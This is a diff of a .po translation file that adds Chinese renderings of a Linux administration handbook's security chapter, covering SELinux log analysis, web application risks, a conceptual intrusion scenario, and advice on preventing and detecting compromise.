 msgid "However, an empirical approach is possible. Once the relevant objects are correctly labeled, you can use the application in permissive mode: the operations that would be forbidden are logged but still succeed. By analyzing the logs, you can now identify the operations to allow. Here is an example of such a log entry:"
-msgstr ""
+msgstr "然而，实验方法也可以。一旦相关的对象被正确标识，可以在许可模式下使用应用程序：应该禁止的操作会被记录但是仍然会运行。通过分析日志，就能识别那些操作应该允许。这里有一个此类日志条目示例："
 
 #. Tag: programlisting
 #, no-c-format
 msgid "avc:  denied  { read write } for  pid=1876 comm=\"syslogd\" name=\"xconsole\" dev=tmpfs ino=5510 scontext=system_u:system_r:syslogd_t:s0 tcontext=system_u:object_r:device_t:s0 tclass=fifo_file\n"
-msgstr ""
+msgstr "avc:  denied  { read write } for  pid=1876 comm=\"syslogd\" name=\"xconsole\" dev=tmpfs ino=5510 scontext=system_u:system_r:syslogd_t:s0 tcontext=system_u:object_r:device_t:s0 tclass=fifo_file\n"
 
 #. Tag: para
 #, no-c-format
 msgid "To better understand this message, let us study it piece by piece."
-msgstr ""
+msgstr "为了更好的理解这条信息，我们逐一分析。"
 
 #. Tag: title
 #, no-c-format
 msgid "Analysis of an SELinux trace"
-msgstr ""
+msgstr "SELinux 追踪记录分析"
 
 #. Tag: entry
 #, no-c-format
 msgid "Message"
-msgstr ""
+msgstr "消息"
 
 #. Tag: entry
 #, no-c-format
 msgid "Description"
-msgstr ""
+msgstr "描述"
 
 #. Tag: entry
 #, no-c-format
 msgid "<computeroutput>avc: denied</computeroutput>"
-msgstr ""
+msgstr "<computeroutput>avc: denied</computeroutput>"
 
 #. Tag: entry
 #, no-c-format
 msgid "An operation has been denied."
-msgstr ""
+msgstr "一个操作被拒绝。"
 
 #. Tag: entry
 #, no-c-format
 msgid "<computeroutput>{ read write }</computeroutput>"
-msgstr ""
+msgstr "<computeroutput>{ read write }</computeroutput>"
 
 #. Tag: entry
 #, no-c-format
 msgid "This operation required the <literal>read</literal> and <literal>write</literal> permissions."
-msgstr ""
+msgstr "该操作需要 <literal>读－read</literal> 和 <literal>写－write</literal> 许可。"
 
 #. Tag: entry
 #, no-c-format
 msgid "<computeroutput>pid=1876</computeroutput>"
-msgstr ""
+msgstr "<computeroutput>pid=1876</computeroutput>"
 
 #. Tag: entry
 #, no-c-format
 msgid "The process with PID 1876 executed the operation (or tried to execute it)."
-msgstr ""
+msgstr "进程号为1876的进程执行的操作（或者试图执行）。"
 
 #. Tag: entry
 #, no-c-format
 msgid "<computeroutput>comm=\"syslogd\"</computeroutput>"
-msgstr ""
+msgstr "<computeroutput>comm=\"syslogd\"</computeroutput>"
 
 #. Tag: entry
 #, no-c-format
 msgid "The process was an instance of the <literal>syslogd</literal> program."
-msgstr ""
+msgstr "该进程是 <literal>syslogd</literal> 程序的一个实例。"
 
 #. Tag: entry
 #, no-c-format
 msgid "<computeroutput>name=\"xconsole\"</computeroutput>"
-msgstr ""
+msgstr "<computeroutput>name=\"xconsole\"</computeroutput>"
 
 #. Tag: entry
 #, no-c-format
 msgid "The target object was named <literal>xconsole</literal>."
-msgstr ""
+msgstr "目标对象名称是 <literal>xconsole</literal>。"
 
 #. Tag: entry
 #, no-c-format
 msgid "<computeroutput>dev=tmpfs</computeroutput>"
-msgstr ""
+msgstr "<computeroutput>dev=tmpfs</computeroutput>"
 
 #. Tag: entry
 #, no-c-format
 msgid "The device hosting the target object is a <literal>tmpfs</literal> (an in-memory filesystem). For a real disk, you could see the partition hosting the object (for example: “hda3”)."
-msgstr ""
+msgstr "承载目标对象的设备是 <literal>tmpfs</literal>（一个内存文件系统）。对于真实磁盘，可以看到承载对象的分区（例如：“hda3”）。"
 
 #. Tag: entry
 #, no-c-format
 msgid "<computeroutput>ino=5510</computeroutput>"
-msgstr ""
+msgstr "<computeroutput>ino=5510</computeroutput>"
 
 #. Tag: entry
 #, no-c-format
 msgid "The object is identified by the inode number 5510."
-msgstr ""
+msgstr "对象的节点（inode）号码是5510。"
 
 #. Tag: entry
 #, no-c-format
 msgid "<computeroutput>scontext=system_u:system_r:syslogd_t:s0</computeroutput>"
-msgstr ""
+msgstr "<computeroutput>scontext=system_u:system_r:syslogd_t:s0</computeroutput>"
 
 #. Tag: entry
 #, no-c-format
 msgid "This is the security context of the process who executed the operation."
-msgstr ""
+msgstr "这是执行操作进程的安全上下文。"
 
 #. Tag: entry
 #, no-c-format
 msgid "<computeroutput>tcontext=system_u:object_r:device_t:s0</computeroutput>"
-msgstr ""
+msgstr "<computeroutput>tcontext=system_u:object_r:device_t:s0</computeroutput>"
 
 #. Tag: entry
 #, no-c-format
 msgid "This is the security context of the target object."
-msgstr ""
+msgstr "这是执行操作对象的安全上下文。"
 
 #. Tag: entry
 #, no-c-format
 msgid "<computeroutput>tclass=fifo_file</computeroutput>"
-msgstr ""
+msgstr "<computeroutput>tclass=fifo_file</computeroutput>"
 
 #. Tag: entry
 #, no-c-format
 msgid "The target object is a FIFO file."
-msgstr ""
+msgstr "目标对象是一个 FIFO 文件。"
 
 #. Tag: para
 #, no-c-format
 msgid "By observing this log entry, it is possible to build a rule that would allow this operation. For example: <literal>allow syslogd_t device_t:fifo_file { read write }</literal>. This process can be automated, and it's exactly what the <command>audit2allow</command> command (of the <emphasis role=\"pkg\">policycoreutils</emphasis> package) offers. This approach is only useful if the various objects are already correctly labeled according to what must be confined. In any case, you will have to carefully review the generated rules and validate them according to your knowledge of the application. Effectively, this approach tends to grant more rights than are really required. The proper solution is often to create new types and to grant rights on those types only. It also happens that a denied operation isn't fatal to the application, in which case it might be better to just add a “<literal>dontaudit</literal>” rule to avoid the log entry despite the effective denial."
-msgstr ""
+msgstr "通过观察日志条目，就可以创建允许操作的规则。例如：<literal>allow syslogd_t device_t:fifo_file { read write }</literal>。这一过程可以自动化，这正是 <command>audit2allow</command>（在 <emphasis role=\"pkg\">policycoreutils</emphasis> 软件包）命令所提供的功能。这种方法只在各种对象根据其限制已被正确标识时有用。任何情况下，都要仔细审阅创建的规则并根据对应用程序的认识验证它们。实际上，这种方法通常会授予比实际需求更多的权限。恰当的方案是创建新的类型并且只授予针对这些类型的权限。有时候，拒绝操作对应用程序并不是致命的，这种情况下，可以添加一条“<literal>忽略－dontaudit</literal>”规则来避免记入日志。"
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>COMPLEMENTS</emphasis> No roles in policy rules"
-msgstr ""
+msgstr "<emphasis>补充</emphasis>无角色的策略规则"
 
 #. Tag: para
 #, no-c-format
 msgid "It might seem weird that roles do not appear at all when creating new rules. SELinux uses only the domains to find out which operations are allowed. The role intervenes only indirectly by allowing the user to switch to another domain. SELinux is based on a theory known as <emphasis>Type Enforcement</emphasis> and the type is the only element that matters when granting rights. <indexterm><primary>Type Enforcement</primary></indexterm> <indexterm><primary>Enforcement, Type Enforcement</primary></indexterm>"
-msgstr ""
+msgstr "在创建新规则时，完全看不到角色是比较怪异的。SELinux 只使用域来确定哪些操作允许。角色只是通过允许用户切换到另外的域间接起作用。SELinux 是基于被称为<emphasis>类型增强－Type Enforcement </emphasis>的理论，类型是唯一影响授权的元素。<indexterm><primary>类型增强－Type Enforcement</primary></indexterm> <indexterm><primary>增强，类型增强</primary></indexterm>"
 
 #. Tag: title
 #, no-c-format
 msgid "Compiling the Files"
-msgstr ""
+msgstr "编译文件"
 
 #. Tag: para
 #, no-c-format
 msgid "Once the 3 files (<filename>example.if</filename>, <filename>example.fc</filename>, and <filename>example.te</filename>) match your expectations for the new rules, just run <command>make</command> to generate a module in the <filename>example.pp</filename> file (you can immediately load it with <command>semodule -i example.pp</command>). If several modules are defined, <command>make</command> will create all the corresponding <filename>.pp</filename> files."
-msgstr ""
+msgstr "一旦三个文件（<filename>example.if</filename>, <filename>example.fc</filename>, 和 <filename>example.te</filename>）符合对新规则的预期要求，运行 <command>make</command> 在 <filename>example.pp</filename> 文件中创建模块（可以使用 <command>semodule -i example.pp</command> 立即加载）。如果定义了几个模块，<command>make</command> 会生成所有对应的 <filename>.pp</filename> 文件。"
 
 #. Tag: title
 #, no-c-format
 msgid "Other Security-Related Considerations"
-msgstr ""
+msgstr "其他安全相关事项"
 
 #. Tag: para
 #, no-c-format
 msgid "Security is not just a technical problem; more than anything, it's about good practices and understanding the risks. This section reviews some of the more common risks, as well as a few best practices which should, depending on the case, increase security or lessen the impact of a successful attack."
-msgstr ""
+msgstr "安全不仅是一个技术问题；它更是良好的习惯和对风险的理解。本节讨论一些更常见的风险，还有一些增加安全或者减小被攻击后影响的良好习惯。"
 
 #. Tag: title
 #, no-c-format
 msgid "Inherent Risks of Web Applications"
-msgstr ""
+msgstr "网页应用程序的内在风险"
 
 #. Tag: para
 #, no-c-format
 msgid "The universal character of web applications led to their proliferation. Several are often run in parallel: a webmail, a wiki, some groupware system, forums, a photo gallery, a blog, and so on. Many of those applications rely on the “LAMP” (<emphasis>Linux, Apache, MySQL, PHP</emphasis>) stack. Unfortunately, many of those applications were also written without much consideration for security problems. Data coming from outside is, too often, used with little or no validation. Providing specially-crafted values can be used to subvert a call to a command so that another one is executed instead. Many of the most obvious problems have been fixed as time has passed, but new security problems pop up regularly."
-msgstr ""
+msgstr "Web 应用的普遍性导致其剧增。往往是几个并行运行：网页邮件，维基，群件系统，论坛，图片库，博客等等。许多应用依赖于“LAMP”（<emphasis>Linux, Apache, MySQL, PHP</emphasis>）。不幸的是，很多这种应用在编写的时候没有考虑安全问题。而源于外部世界的数据通常很少或者不去验证。使用特别数值可以将一个调用暗中转换成一个指令，以便于执行另外的替代程序。许多明显的问题随着时间的推移都被修正了，然而新的安全问题又时不时的跳出来。"
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>VOCABULARY</emphasis> SQL injection"
-msgstr ""
+msgstr "<emphasis>词汇</emphasis> SQL 注入"
 
 #. Tag: para
 #, no-c-format
 msgid "When a program inserts data into SQL queries in an insecure manner, it becomes vulnerable to SQL injections; this name covers the act of changing a parameter in such a way that the actual query executed by the program is different from the intended one, either to damage the database or to access data that should normally not be accessible. <ulink type=\"block\" url=\"http://en.wikipedia.org/wiki/SQL_Injection\" />"
-msgstr ""
+msgstr "如果程序以一种不安全的方式将数据插入到 SQL 查询，就会很容易受到 SQL 注入攻击；这个名字指这样一种行为：改变一个参数来执行不同于预期的查询，或者用于破坏数据库，或者用于读取那些不应该读取的数据。<ulink type=\"block\" url=\"http://en.wikipedia.org/wiki/SQL_Injection\" />"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary>SQL injection</primary>"
-msgstr ""
+msgstr "<primary>SQL 注入</primary>"
 
 #. Tag: para
 #, no-c-format
 msgid "Updating web applications regularly is therefore a must, lest any cracker (whether a professional attacker or a script kiddy) can exploit a known vulnerability. The actual risk depends on the case, and ranges from data destruction to arbitrary code execution, including web site defacement."
-msgstr ""
+msgstr "因此，定期更新 web 应用是必须的，以减少任何攻击者（无论是专业攻击者或者脚本小子）可以利用的已知漏洞。实际的风险取决于所处的情况，从数据销毁到执行任意代码，也包括网络涂改。"
 
 #. Tag: title
 #, no-c-format
 msgid "Knowing What To Expect"
-msgstr ""
+msgstr "知道预期什么"
 
 #. Tag: para
 #, no-c-format
 msgid "A vulnerability in a web application is often used as a starting point for cracking attempts. What follows is a short review of possible consequences."
-msgstr ""
+msgstr "网页应用程序的弱点常常是攻击尝试的起点。下面简单的回顾一下可能的后果。"
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>QUICK LOOK</emphasis> Filtering HTTP queries"
-msgstr ""
+msgstr "<emphasis>速览</emphasis>过滤 HTTP 查询"
 
 #. Tag: para
 #, no-c-format
 msgid "Apache 2 includes modules allowing filtering incoming HTTP queries. This allows blocking some attack vectors. For instance, limiting the length of parameters can prevent buffer overflows. More generally, one can validate parameters before they are even passed to the web application and restrict access along many criteria. This can even be combined with dynamic firewall updates, so that a client infringing one of the rules is banned from accessing the web server for a given period of time."
-msgstr ""
+msgstr "Apache 2 中包含了可用于过滤 HTTP 请求的模块。可以用来阻止某些攻击者。例如，限制参数的长度可以阻止缓冲区溢出。更一般地，可以在传递给应用程序之前验证其参数并限制其访问。这些甚至可以与动态防火墙更新相结合，违反规则的客户在一定时间内被禁止访问网页服务器。"
 
 #. Tag: para
 #, no-c-format
 msgid "Setting up these checks can be a long and cumbersome task, but it can pay off when the web application to be deployed has a dubious track record where security is concerned."
-msgstr ""
+msgstr "设定这些检查是费时，费劲的任务。但当网页应用有一条可疑追踪记录时，就会有所回报。"
 
 #. Tag: para
 #, no-c-format
 msgid "<emphasis>mod-security</emphasis> (in the <emphasis role=\"pkg\">libapache-mod-security</emphasis> package) is the main such module."
-msgstr ""
+msgstr "<emphasis>mod-security</emphasis>（在 <emphasis role=\"pkg\">libapache-mod-security</emphasis> 软件包中）是此类主要模块。"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary><emphasis role=\"pkg\">libapache-mod-security</emphasis></primary>"
-msgstr ""
+msgstr "<primary><emphasis role=\"pkg\">libapache-mod-security</emphasis></primary>"
 
 #. Tag: indexterm
 #, no-c-format
 msgid "<primary><emphasis>mod-security</emphasis></primary>"
-msgstr ""
+msgstr "<primary><emphasis>mod-security</emphasis></primary>"
 
 #. Tag: para
 #, no-c-format
 msgid "The consequences of an intrusion will have various levels of obviousness depending on the motivations of the attacker. <emphasis>Script-kiddies</emphasis> only apply recipes they find on web sites; most often, they deface a web page or delete data. In more subtle cases, they add invisible contents to web pages so as to improve referrals to their own sites in search engines."
-msgstr ""
+msgstr "侵入的结果会留下各自痕迹，取决于攻击者的动机。<emphasis>脚本小子（Script-kiddies）</emphasis>只会用他们在网上找到的方法；常常是涂改页面或者删除数据。狡猾一点的，会在网页中添加无形内容，来提高他们自己网站在搜索引擎中的引用次数。"
 
 #. Tag: para
 #, no-c-format
 msgid "A more advanced attacker will go beyond that. A disaster scenario could go on in the following fashion: the attacker gains the ability to execute commands as the <literal>www-data</literal> user, but executing a command requires many manipulations. To make their life easier, they install other web applications specially designed to remotely execute many kinds of commands, such as browsing the filesystem, examining permissions, uploading or downloading files, executing commands, and even provide a network shell. Often, the vulnerability will allow running a <command>wget</command> command that will download some malware into <filename>/tmp/</filename>, then executing it. The malware is often downloaded from a foreign website that was previously compromised, in order to cover tracks and make it harder to follow the scent to the actual origin of the attack."
-msgstr ""
+msgstr "一个更高级别的攻击者远胜于此。灾难性的场景可能以下面的方式呈现：攻击者获得以 <literal>www-data</literal> 用户身份执行命令的能力，但是执行命令需要多次操作。为了简单化，他们还会安装专门为远程执行命令而设计的网页应用程序，例如浏览文件系统，检查权限许可，上传或者下载文件，执行命令，甚至是提供网络控制台。通常，漏洞会允许运行 <command>wget</command> 命令将恶意软件下载到 <filename>/tmp/</filename> 中并执行。恶意软件通常从一个已经攻陷的国外网站下载，这样可以掩盖其踪迹并使嗅探攻击的真正出处更加困难。"
 
 #. Tag: para
 #, no-c-format
 msgid "At this point, the attacker has enough freedom of movement that they often install an IRC <emphasis>bot</emphasis> (a robot that connects to an IRC server and can be controlled by this channel). This bot is often used to share illegal files (unauthorized copies of movies or software, and so on). A determined attacker may want to go even further. The <literal>www-data</literal> account does not allow full access to the machine, and the attacker will try to obtain administrator privileges. Now, this should not be possible, but if the web application was not up-to-date, chances are that the kernel and other programs are outdated too; this sometimes follows a decision from the administrator who, despite knowing about the vulnerability, neglected to upgrade the system since there are no local users. The attacker can then take advantage of this second vulnerability to get root access."
-msgstr ""
+msgstr "此时，攻击者就有足够的行动自由了，他们常常会安装一个 IRC <emphasis>机器人－bot</emphasis>（一个连接到 IRC 服务器的机器人并且可以通过频道来控制）。该机器人常常用来共享非法文件（未授权的电影或软件拷贝，等等）。一个坚决的攻击者可能会走到更远。<literal>www-data</literal> 账户不允许对机器的完全存取，攻击者会尝试获取管理员权限。现在，这个还不可能，但是如果网页应用程序不是最新的，内核和其他程序有可能也是过期的；这有时候源于管理员的决断，尽管知道容易遭受攻击，由于没有本地用户仍然忽略更新。然后，攻击者就会利用第二个弱点来取得超级用户权限。"
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>VOCABULARY</emphasis> Privilege escalation"
-msgstr ""
+msgstr "<emphasis>词汇</emphasis>特权升级"
 
 #. Tag: para
 #, no-c-format
 msgid "This term covers anything that can be used to obtain more permissions than a given user should normally have. The <command>sudo</command> program is designed for precisely the purpose of giving administrative rights to some users. But the same term is also used to describe the act of an attacker exploiting a vulnerability to obtain undue rights."
-msgstr ""
+msgstr "该术语涵盖了任何用于获得比给定用户正常情况下更多权限的行为。<command>sudo</command> 程序被设计用来将管理员权限赋予某些用户。但是，同样的术语也用来描述攻击者利用漏洞获取不当权限。"
 
 #. Tag: para
 #, no-c-format
 msgid "Now the attacker owns the machine; they will usually try to keep this privileged access for as long as possible. This involves installing a <emphasis>rootkit</emphasis>, a program that will replace some components of the system so that the attacker will be able to obtain the administrator privileges again at a later time; the rootkit also tries hiding its own existence as well as any traces of the intrusion. A subverted <command>ps</command> program will omit to list some processes, <command>netstat</command> will not list some of the active connections, and so on. Using the root permissions, the attacker was able to observe the whole system, but didn't find important data; so they will try accessing other machines in the corporate network. Analyzing the administrator's account and the history files, the attacker finds what machines are routinely accessed. By replacing <command>sudo</command> or <command>ssh</command> with a subverted program, the attacker can intercept some of the administrator's passwords, which they will use on the detected servers… and the intrusion can propagate from then on."
-msgstr ""
+msgstr "现在攻击者拥有了机器；他们将试图尽可能长时间的保持其权限。这就要安装 <emphasis>后门－rootkit</emphasis>，一个取代系统组件的程序，以便攻击者可以在随后的时间重新获取管理员特权；后门软件也会试图隐藏自己和入侵痕迹。被破坏的 <command>ps</command> 程序会漏掉一些进程，<command>netstat</command> 也不会列出一些活动链接，等等。拥有超级用户权限，攻击者可以观察整个系统，但是不一定能找到重要数据；因此他们会尝试侵入协作网络中其他的机器。分析管理员的账户和历史记录，攻击者会发现哪些机器被经常访问。使用被修改的程序替换 <command>sudo</command> 或者 <command>ssh</command>，攻击者能截取到部分管理员密码，并将其用在探测到的服务器上．．．入侵就会传播开来。"
 
 #. Tag: para
 #, no-c-format
 msgid "This is a nightmare scenario which can be prevented by several measures. The next few sections describe some of these measures."
-msgstr ""
+msgstr "这种噩梦可以通过几种方法阻止。接下来的章节会讲述几种方法。"
 
 #. Tag: title
 #, no-c-format
 msgid "Choosing the Software Wisely"
-msgstr ""
+msgstr "明智地选择软件"
 
 #. Tag: para
 #, no-c-format
 msgid "Once the potential security problems are known, they must be taken into account at each step of the process of deploying a service, especially when choosing the software to install. Many web sites, such as <literal>SecurityFocus.com</literal>, keep a list of recently-discovered vulnerabilities, which can give an idea of a security track record before some particular software is deployed. Of course, this information must be balanced against the popularity of said software: a more widely-used program is a more tempting target, and it will be more closely scrutinized as a consequence. On the other hand, a niche program may be full of security holes that never get publicized due to a lack of interest in a security audit."
-msgstr ""
+msgstr "一旦潜在的安全问题被暴露，就必须在配置服务的每个步骤都要考虑，特别是在选择安装软件的时候。许多网站，例如 <literal>SecurityFocus.com</literal>，会列出最近发现的漏洞，在一些特殊软件部署之前会给出安全记录。当然，要平衡此信息和所述软件的普及程度：越是使用广泛的软件，越是诱人，因而审查也更严密。"
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>VOCABULARY</emphasis> Security audit"
-msgstr ""
+msgstr "<emphasis>词汇</emphasis> 安全审核"
 
 #. Tag: para
 #, no-c-format
 msgid "A security audit is the process of thoroughly reading and analyzing the source code of some software, looking for potential security vulnerabilities it could contain. Such audits are usually proactive and they are conducted to ensure a program meets certain security requirements."
-msgstr ""
+msgstr "安全审核是彻底地阅读和分析某些软件的源代码，并寻找它可能包含的潜在安全漏洞。这种审核通常是预先的，并用于确保程序符合特定的安全需求。"
 
 #. Tag: para
 #, no-c-format
 msgid "In the Free Software world, there is generally ample room for choice, and choosing one piece of software over another should be a decision based on the criteria that apply locally. More features imply an increased risk of a vulnerability hiding in the code; picking the most advanced program for a task may actually be counter-productive, and a better approach is usually to pick the simplest program that meets the requirements."
-msgstr ""
+msgstr "在自由软件的世界里，有大量的选择。选择某一个软件而非另一个，应该基于具体的准则来做出决定。更多的特性暗含着代码背后隐藏着更多的漏洞风险；为某个任务选择最高级的程序实际上可能适得其反，较好的方法通常是选择满足需求最简单的程序。"
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>VOCABULARY</emphasis> Zero-day exploit"
-msgstr ""
+msgstr "<emphasis>词汇</emphasis> 0day 漏洞"
 
 #. Tag: para
 #, no-c-format
 msgid "A <emphasis>zero-day exploit</emphasis> attack is hard to prevent; the term covers a vulnerability that is not yet known to the authors of the program."
-msgstr ""
+msgstr "<emphasis>零日漏洞</emphasis>攻击很难预防；该术语用于描述程序中那些作者还不知道的漏洞。"
 
 #. Tag: title
 #, no-c-format
 msgid "Managing a Machine as a Whole"
-msgstr ""
+msgstr "将机器作为整体管理"
 
 #. Tag: para
 #, no-c-format
 msgid "Most Linux distributions install by default a number of Unix services and many tools. In many cases, these services and tools are not required for the actual purposes for which the administrator set up the machine. As a general guideline in security matters, unneeded software is best uninstalled. Indeed, there's no point in securing an FTP server, if a vulnerability in a different, unused service can be used to get administrator privileges on the whole machine."
-msgstr ""
+msgstr "大部分 Linux 发行版会默认安装许多 Unix 服务和工具。很多情况下，这些服务和工具在管理员设置机器的时候是不需要的。作为安全方面的一般原则，不需要的软件最好不要安装。实际上，如果未使用服务中的漏洞可以用于获取整个机器的管理员特权，那么保护 FTP 服务是没有意义的。"
 
 #. Tag: para
 #, no-c-format
 msgid "By the same reasoning, firewalls will often be configured to only allow access to services that are meant to be publicly accessible."
-msgstr ""
+msgstr "出于同样的原因，防火墙通常配置为只允许访问公共服务。"
 
 #. Tag: para
 #, no-c-format
 msgid "Current computers are powerful enough to allow hosting several services on the same physical machine. From an economic viewpoint, such a possibility is interesting: only one computer to administrate, lower energy consumption, and so on. From the security point of view, however, such a choice can be a problem. One compromised service can bring access to the whole machine, which in turn compromises the other services hosted on the same computer. This risk can be mitigated by isolating the services. This can be attained either with virtualization (each service being hosted in a dedicated virtual machine), or with SELinux (each service daemon having an adequately designed set of permissions)."
-msgstr ""
+msgstr "目前的计算机足以强大，可以在同一台物理机器上托管多个服务。从经济的观点来看，这种特性很有趣：只需管理一台计算机，更低的能源消耗，等等。从安全的观点来看，这么做会有问题。一个被攻陷的服务可能用来访问整个机器，反过来危机同一台电脑上的其他服务。这种风险可以通过隔离服务来减少。可以通过虚拟化（每个服务托管在专用虚拟机）或者 SELinux（每个守护进程有一套专门的许可集）来实现。"
 
 #. Tag: title
 #, no-c-format
 msgid "Users Are Players"
-msgstr ""
+msgstr "用户是参与者"
 
 #. Tag: para
 #, no-c-format
 msgid "Discussing security immediately brings to mind protection against attacks by anonymous crackers hiding in the Internet jungle; but an often-forgotten fact is that risks also come from inside: an employee about to leave the company could download sensitive files on the important projects and sell them to competitors, a negligent salesman could leave their desk without locking their session during a meeting with a new prospect, a clumsy user could delete the wrong directory by mistake, and so on."
-msgstr ""
+msgstr "谈到安全，要马上考虑保护免受隐藏在互联网丛林里匿名破坏者的攻击；但是，经常被遗忘的事实是－风险也来自内部：离职雇员会下载重要敏感的项目文件并买给竞争对手；大意的销售可能在开前景规划会议时，离开电脑而没有锁定桌面；笨拙的用户可能误删目录；等等。"
 
 #. Tag: para
 #, no-c-format
 msgid "The response to these risks can involve technical solutions: no more than the required permissions should be granted to users, and regular backups are a must. But in many cases, the appropriate protection is going to involve training users to avoid the risks."
-msgstr ""
+msgstr "对付这些风险可以使用技术手段：授予用户的权限不多于所需求的权限，并且必须进行常规备份。但是在许多情况下，适当的保护也包含培训用户进而规避风险。"
 
 #. Tag: title
 #, no-c-format
 msgid "<emphasis>QUICK LOOK</emphasis> <emphasis role=\"pkg\">autolog</emphasis>"
-msgstr ""
+msgstr "<emphasis>速览</emphasis> <emphasis role=\"pkg\">autolog</emphasis>"
 
 #. Tag: para
 #, no-c-format
 msgid "The <emphasis role=\"pkg\">autolog</emphasis> package provides a program that automatically disconnects inactive users after a configurable delay. It also allows killing user processes that persist after a session ends, thereby preventing users from running daemons."
-msgstr ""
+msgstr "<emphasis role=\"pkg\">autolog</emphasis> 软件包可以在设定的延时过后自动断开非活动用户。也可以在会话结束后，杀死用户进程，进而防止用户运行守护进程。"
 
 #. Tag: title
 #, no-c-format
 msgid "Physical Security"
-msgstr ""
+msgstr "物理安全"
 
 #. Tag: para
 #, no-c-format
 msgid "There is no point in securing the services and networks if the computers themselves are not protected. Important data deserve being stored on hot-swappable hard disks in RAID arrays, because hard disks fail eventually and data availability is a must. But if any pizza delivery boy can enter the building, sneak into the server room and run away with a few selected hard disks, an important part of security is not fulfilled. Who can enter the server room? Is access monitored? These questions deserve consideration (and an answer) when physical security is being evaluated."
-msgstr ""
+msgstr "如果计算机本身没有受到保护，保护服务和网络是没有意义的。重要数据应该存储在 RAID 阵列可热交换硬盘上，即使硬盘失效，但是数据必须可用。如果送披萨的小伙子能进入大楼，溜进服务器房间并带着几块硬盘逃跑，那么安全的重要方面没有满足。谁可以进入服务器房间？出入被监控了吗？当评估物理安全时，需要考虑这些问题。"
 
 #. Tag: para
 #, no-c-format
 msgid "Physical security also includes taking into consideration the risks for accidents such as fires. This particular risk is what justifies storing the backup media in a separate building, or at least in a fire-proof strongbox."
-msgstr ""
+msgstr "物理安全也包括考虑事故风险，例如火灾。这种特殊风险说明有理由将备份介质保存在单独的建筑物，或者至少保存在防火保险箱内。"
 
 #. Tag: title
 #, no-c-format
 msgid "Legal Liability"
-msgstr ""
+msgstr "法律责任"
 
 #. Tag: para
 #, no-c-format
 msgid "An administrator is, more or less implicitly, trusted by their users as well as the users of the network in general. They should therefore avoid any negligence that malevolent people could exploit."
-msgstr ""
+msgstr "管理员或多或少被用户和网络用户所信任。因此，应避免任何可能被恶人利用的漏洞。"
 
 #. Tag: para
 #, no-c-format
 msgid "An attacker taking control of your machine then using it as a forward base (known as a “relay system”) from which to perform other nefarious activities could cause legal trouble for you, since the attacked party would initially see the attack coming from your system, and therefore consider you as the attacker (or as an accomplice). In many cases, the attacker will use your server as a relay to send spam, which shouldn't have much impact (except potentially registration on black lists that could restrict your ability to send legitimate emails), but won't be pleasant nevertheless. In other cases, more important trouble can be caused from your machine, for instance denial of service attacks. This will sometimes induce loss of revenue, since the legitimate services will be unavailable and data can be destroyed; sometimes this will also imply a real cost, because the attacked party can start legal proceedings against you. Rights-holders can sue you if an unauthorized copy of a work protected by copyright law is shared from your server, as well as other companies compelled by service level agreements if they are bound to pay penalties following the attack from your machine."
-msgstr ""
+msgstr "攻击者控制你的机器，然后用它作为基础（称为“中继系统”）执行其他恶意活动，会导致你法律上的麻烦。因为被攻击方最初会看到攻击源于你的系统，会把你当做攻击者（或者共犯）。在许多情况下，攻击者会使用你的服务器作为垃圾邮件的中继，这并不会有大的影响（除了将你列为黑名单，并限制发送合法邮件），但也不舒服。其他情况下，可能从你的机器产生更大的麻烦，譬如拒绝服务攻击。因为正常服务不可用，数据被损坏，这有时会导致收入损失；有时这也包含着实实在在的成本，因为被攻击方可能启动法律程序。如果未授权的拷贝通过你的服务器共享，版权所有者可以起诉你，以及其他遵从服务级别协议的公司－如果从你的机器遭受攻击，他们必须受到惩罚。"
 
 #. Tag: para
 #, no-c-format
 msgid "When these situations occur, claiming innocence is not usually enough; at the very least, you will need convincing evidence showing suspect activity on your system coming from a given IP address. This won't be possible if you neglect the recommendations of this chapter and let the attacker obtain access to a privileged account (root, in particular) and use it to cover their tracks."
-msgstr ""
+msgstr "如果此类情况发生了，自称清白通常是不够的；至少，你要出示在你系统上进行可疑活动源于指定 IP 的证据。这几乎是不可能的，如果你忽略了本章的建议，让攻击者获得特权账户（特别是超级用户）并使用它来掩盖痕迹。"
 
 #. Tag: title
 #, no-c-format
 msgid "Dealing with a Compromised Machine"
-msgstr ""
+msgstr "处理被攻陷的机器"
 
 #. Tag: para
 #, no-c-format
 msgid "Despite the best intentions and however carefully designed the security policy, an administrator eventually faces an act of hijacking. This section provides a few guidelines on how to react when confronted with these unfortunate circumstances."
-msgstr ""
+msgstr "尽管有最好的意图和精心设计的安全策略，管理员最终还是会面对劫持行为。本节提供一些指导，介绍碰到这种情况时如何应对。"
 
 #. Tag: title
 #, no-c-format
 msgid "Detecting and Seeing the Cracker's Intrusion"
-msgstr ""
+msgstr "探测并观察黑客入侵"
 
 #. Tag: para
 #, no-c-format
 msgid "The first step of reacting to cracking is to be aware of such an act. This is not self-evident, especially without an adequate monitoring infrastructure."
-msgstr ""
+msgstr "对付侵入的第一步是要注意黑客的这种行为。它通常不是自明的，特别是在没有足够的监控措施时。"
 
 #. Tag: para
 #, no-c-format
 msgid "Cracking acts are often not detected until they have direct consequences on the legitimate services hosted on the machine, such as connections slowing down, some users being unable to connect, or any other kind of malfunction. Faced with these problems, the administrator needs to have a good look at the machine and carefully scrutinize what misbehaves. This is usually the time when they discover an unusual process, for instance one named <literal>apache</literal> instead of the standard <literal>/usr/sbin/apache2</literal>. If we follow that example, the thing to do is to note its process identifier, and check <filename>/proc/<replaceable>pid</replaceable>/exe</filename> to see what program this process is currently running:"
-msgstr ""
+msgstr "破解行为通常不能被侦测到，除非这些行为对宿主机上的正常服务产生了直接影响，例如连接减缓，某些用户不能连接，或者其他类型的故障。面对这些问题，管理员需要好好看看机器并仔细检查异常行为。这时通常会发现异常进程，譬如名为 <literal>apache</literal> 而非标准的 <literal>/usr/sbin/apache2</literal>。按照这个例子，接下来要做的是注意进程标识，并检查 <filename>/proc/<replaceable>pid</replaceable>/exe</filename> 看看此进程当前运行的是什么程序："
 
 #. Tag: screen
 #, no-c-format
@@ -2094,171 +2247,175 @@ msgid ""
